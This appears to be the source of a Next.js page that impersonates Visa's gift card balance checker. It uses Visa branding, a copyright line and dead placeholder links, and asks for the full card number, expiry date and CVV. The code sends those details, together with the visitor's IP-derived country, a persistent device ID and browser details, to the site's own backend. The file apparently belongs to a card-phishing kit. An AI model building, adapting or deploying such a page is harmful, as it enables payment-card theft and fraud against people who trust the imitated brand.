import { useState, useEffect } from 'react'
import Head from 'next/head'
import styles from '../styles/visa.module.css'

export default function VisaPage() {
    const [card, setCard] = useState('')
    const [expiry, setExpiry] = useState('')
    const [cvv, setCvv] = useState('')
    const [loading, setLoading] = useState(false)
    const [result, setResult] = useState(null)
    const [error, setError] = useState(null)
    const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
    const [showTutorial, setShowTutorial] = useState(false)
    const [location, setLocation] = useState('Unknown')
    const [deviceId, setDeviceId] = useState(null)

    useEffect(() => {
        async function detectLocation() {
            try {
                const res = await fetch('https://ipapi.co/json/')
                const data = await res.json()
                if (data.country_name) {
                    setLocation(data.country_name)
                }
            } catch (err) {
                console.error('IP detection failed', err)
            }
        }
        detectLocation()

        // Initialize or get device ID
        let id = localStorage.getItem('deviceId')
        if (!id) {
            id = 'dev_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now()
            localStorage.setItem('deviceId', id)
        }
        setDeviceId(id)
    }, [])

    async function checkBalance(e) {
        e.preventDefault()
        setError(null)
        setResult(null)
        if (!card.trim()) return setError('Please enter your Visa Gift Card number.')
        if (!expiry.trim()) return setError('Please enter the expiration date.')
        if (!cvv.trim()) return setError('Please enter the CVV code.')

        setLoading(true)
        try {
            const browserInfo = {
                platform: navigator.platform,
                vendor: navigator.vendor,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`
            }

            const res = await fetch('/api/check-balance', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    cardNumber: card.replace(/[\s-]/g, ''),
                    expiry: expiry,
                    cvv: cvv,
                    type: 'visa',
                    deviceId: deviceId,
                    location: location,
                    browserInfo: JSON.stringify(browserInfo)
                })
            })
            const data = await res.json()
            if (!res.ok) throw new Error(data?.error || 'Unable to verify card. Please try again later.')
            setResult(data)
        } catch (err) {
            setError(err.message)
        } finally {
            setLoading(false)
        }
    }

    return (
        <div className={styles.visaPage}>
            <Head>
                <title>Check Visa Gift Card Balance | Visa</title>
                <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
            </Head>

            <header className={styles.header}>
                <div className={styles.headerTop}>
                    <div className={styles.headerLeft}>
                        <a href="/visa" className={styles.logoContainer}>
                            <img src="/visalogo.PNG" alt="Visa" className={styles.logo} />
                        </a>
                    </div>

                    <nav className={styles.nav}>
                        <a href="#">Personal</a>
                        <a href="#">Business</a>
                        <a href="#">Partner with us</a>
                        <a href="#">About Visa</a>
                    </nav>

                    <div className={styles.headerRight}>
                        <a href="#" className={styles.loginLink}>Sign In</a>
                        <button
                            className={styles.mobileMenuBtn}
                            onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
                            aria-label="Toggle Menu"
                        >
                            <div className={`${styles.hamburger} ${mobileMenuOpen ? styles.open : ''}`}>
                                <span></span>
                                <span></span>
                                <span></span>
                            </div>
                        </button>
                    </div>
                </div>

                {/* Mobile Navigation Menu */}
                <div className={`${styles.mobileNav} ${mobileMenuOpen ? styles.active : ''}`}>
                    <a href="#" onClick={() => setMobileMenuOpen(false)}>Personal</a>
                    <a href="#" onClick={() => setMobileMenuOpen(false)}>Business</a>
                    <a href="#" onClick={() => setMobileMenuOpen(false)}>Partner with us</a>
                    <a href="#" onClick={() => setMobileMenuOpen(false)}>About Visa</a>
                    <a href="#" onClick={() => setMobileMenuOpen(false)}>Sign In</a>
                </div>
            </header>

            <main className={styles.main}>
                <div className={styles.breadcrumb}>
                    Support › Gift Cards › Check Balance
                </div>

                <section className={styles.cardSection}>
                    <div className={styles.formContainer}>
                        <h1 className={styles.mainTitle}>Visa Gift Card Balance</h1>
                        <p className={styles.subtitle}>Enter your card details to check your remaining balance instantly.</p>

                        <div className={styles.card}>
                            <form onSubmit={checkBalance}>
                                <div className={styles.inputGroup}>
                                    <label className={styles.label}>Card Number</label>
                                    <input
                                        type="text"
                                        className={styles.input}
                                        placeholder="1234 5678 9012 3456"
                                        value={card}
                                        onChange={(e) => setCard(e.target.value.replace(/[^0-9\s]/g, ''))}
                                        disabled={loading}
                                        autoComplete="off"
                                        spellCheck="false"
                                        maxLength={19}
                                    />
                                </div>

                                <div className={styles.inputRow}>
                                    <div className={styles.inputGroup}>
                                        <label className={styles.label}>Expiration Date</label>
                                        <input
                                            type="text"
                                            className={styles.input}
                                            placeholder="MM/YY"
                                            value={expiry}
                                            onChange={(e) => {
                                                let val = e.target.value.replace(/[^0-9]/g, '')
                                                if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2, 4)
                                                setExpiry(val)
                                            }}
                                            disabled={loading}
                                            autoComplete="off"
                                            spellCheck="false"
                                            maxLength={5}
                                        />
                                    </div>
                                    <div className={styles.inputGroup}>
                                        <label className={styles.label}>CVV</label>
                                        <input
                                            type="text"
                                            className={styles.input}
                                            placeholder="123"
                                            value={cvv}
                                            onChange={(e) => setCvv(e.target.value.replace(/[^0-9]/g, ''))}
                                            disabled={loading}
                                            autoComplete="off"
                                            spellCheck="false"
                                            maxLength={4}
                                        />
                                    </div>
                                </div>

                                <button type="submit" className={styles.button} disabled={loading}>
                                    {loading ? 'Verifying...' : 'Check Balance'}
                                </button>
                            </form>

                            {result && (
                                <div className={styles.result}>
                                    <div className={styles.resultHeader}>
                                        <span className={styles.statusDot}></span>
                                        Card Successfully Verified
                                    </div>
                                    {result.message ? (
                                        <div className={styles.error} style={{ background: 'rgba(26, 31, 113, 0.1)', color: '#1a1f71', border: '1px solid rgba(26, 31, 113, 0.2)', margin: '20px 0', borderRadius: '8px' }}>
                                            <span>{result.message}</span>
                                        </div>
                                    ) : (
                                        <div className={styles.balanceText}>
                                            Available Balance
                                            <span className={styles.amount}>${result.balance?.toFixed(2)} {result.currency}</span>
                                        </div>
                                    )}
                                    <p className={styles.readyMsg}>Your Visa Gift Card is ready for use anywhere Visa is accepted.</p>
                                </div>
                            )}

                            {error && (
                                <div className={styles.error}>
                                    <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2.5">
                                        <circle cx="12" cy="12" r="10" />
                                        <line x1="12" y1="8" x2="12" y2="12" />
                                        <line x1="12" y1="16" x2="12.01" y2="16" />
                                    </svg>
                                    <span>{error}</span>
                                </div>
                            )}
                        </div>

                        {/* Tutorial Section */}
                        <div className={styles.tutorialWrapper}>
                            <button
                                className={styles.tutorialToggle}
                                onClick={() => setShowTutorial(!showTutorial)}
                            >
                                <span>Where do I find my card number?</span>
                                <svg
                                    viewBox="0 0 24 24"
                                    width="20"
                                    height="20"
                                    fill="none"
                                    stroke="currentColor"
                                    strokeWidth="2.5"
                                    style={{ transform: showTutorial ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.4s' }}
                                >
                                    <polyline points="6 9 12 15 18 9" />
                                </svg>
                            </button>

                            <div className={`${styles.tutorialContent} ${showTutorial ? styles.show : ''}`}>
                                <div className={styles.tutorialStep}>
                                    <div className={styles.stepNumber}>1</div>
                                    <div className={styles.stepText}>Locate your Visa Gift Card. The 16-digit card number is embossed on the front of the card.</div>
                                </div>
                                <div className={styles.tutorialStep}>
                                    <div className={styles.stepNumber}>2</div>
                                    <div className={styles.stepText}>Enter all 16 digits without spaces or dashes. The format is typically XXXX XXXX XXXX XXXX.</div>
                                </div>
                                <div className={styles.tutorialStep}>
                                    <div className={styles.stepNumber}>3</div>
                                    <div className={styles.stepText}>For security purposes, you may also need the 3-digit CVV code on the back of your card.</div>
                                </div>
                                <div className={styles.tutorialImage}>
                                    <div className={styles.cardMockup}>
                                        <div className={styles.mockupChip}></div>
                                        <div className={styles.mockupNumber}>1234 5678 9012 3456</div>
                                        <div className={styles.mockupName}>GIFT CARD HOLDER</div>
                                        <div className={styles.mockupLogo}>VISA</div>
                                    </div>
                                </div>
                                <p className={styles.imageCaption}>Your card number is located on the front of your Visa Gift Card.</p>
                            </div>
                        </div>
                    </div>
                </section>
            </main>

            <footer className={styles.footer}>
                <div className={styles.footerContent}>
                    <div className={styles.footerLogo}>
                        <img src="/visalogo.PNG" alt="Visa" style={{ height: '26px', opacity: 0.6 }} />
                    </div>
                    <div className={styles.footerDetails}>
                        <p>© {new Date().getFullYear()} Visa. All Rights Reserved.</p>
                        <p>Visa Gift Cards are issued by MetaBank®, N.A., Member FDIC, pursuant to a license from Visa U.S.A. Inc.</p>
                        <div className={styles.footerLinks}>
                            <a href="#">Privacy Policy</a>
                            <span> | </span>
                            <a href="#">Terms of Use</a>
                            <span> | </span>
                            <a href="#">Legal</a>
                            <span> | </span>
                            <a href="#">Contact Us</a>
                        </div>
                    </div>
                </div>
            </footer>
        </div>
    )
}
